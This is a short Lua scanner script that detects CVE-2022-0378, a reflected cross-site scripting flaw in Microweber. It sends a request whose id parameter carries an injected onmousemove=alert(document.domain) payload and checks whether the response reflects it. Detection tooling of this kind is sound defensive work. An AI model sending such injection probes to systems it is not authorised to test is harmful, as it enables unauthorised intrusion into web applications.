SCAN_TYPE = 3
BODY_MATCH = {
    "mwui_init",
    'onmousemove="alert(document.domain)',
}

local function send_report(url)
    CveReport:setName("CVE-2022-0378")
    CveReport:setDescription("Microweber contains a reflected cross-site scripting in Packagist microweber/microweber prior to 1.2.11.")
    CveReport:setRisk("medium")
    CveReport:setUrl(url)
    Reports:addCveReport(CveReport)
    print_cve_report(CveReport)
end

local function scan_cve(target_path)
    local new_path = pathjoin(HttpMessage:Path(),target_path)
    local new_url = HttpMessage:urlJoin(new_path)
    local resp_status, resp = pcall(function ()
        return http:send{ url = new_url}
    end)
    if resp_status == true then
        local url = resp.url
        local body = resp.body
        local body_match = ResponseMatcher:match_body(body,BODY_MATCH) -- Matching body with List with and conditions
        if resp.status ~= 200 then 
            return
        end
        if body_match then 
            for _,match_txt in ipairs(BODY_MATCH) do
                CveReport:addMatcher(match_txt,3)  -- 3 = response body
            end
            CveReport:addMatcher("200",4)  -- 4 = response status
            send_report(url)
        end
    end
end

function main()
    scan_cve("module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x")
end
